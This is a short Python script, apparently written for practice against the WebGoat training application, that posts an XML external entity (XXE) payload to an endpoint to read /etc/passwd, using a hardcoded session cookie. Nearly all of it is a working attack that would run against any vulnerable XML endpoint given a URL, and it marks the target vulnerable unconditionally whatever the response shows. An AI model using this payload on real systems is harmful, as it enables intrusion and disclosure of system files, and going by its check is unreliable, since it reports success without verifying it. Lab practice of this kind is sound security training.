import requests


# url = "http://127.0.0.1:8080/WebGoat/xxe/content-type"

def inboundxxe(url):
    print("starting the xxe attack in " + url + " endpint...\n")
    is_vulnerable = False
    headers = {'Content-Type': 'application/xml'}
    cookies = {'JSESSIONID': 'PZo86PHS-Wh1PZmPeLUfA6T5MYrNo6OQAhVbwVKy'}
    data = '''<?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE author [
    <!ENTITY js SYSTEM "file:///etc/passwd">
    ]>
    <comment>
        <text>&js;</text>
        <author>xxexxe</author>
    </comment>'''
    response = requests.post(url, headers=headers, data=data, cookies=cookies)

    print("check the website to see if the attack was sucessful")
    print(response.text)
    is_vulnerable = True
    return is_vulnerable
# if __name__ == "__main__":
#     url = "http://127.0.0.1:8080/WebGoat/xxe/content-type"
#     inboundxxe(url)
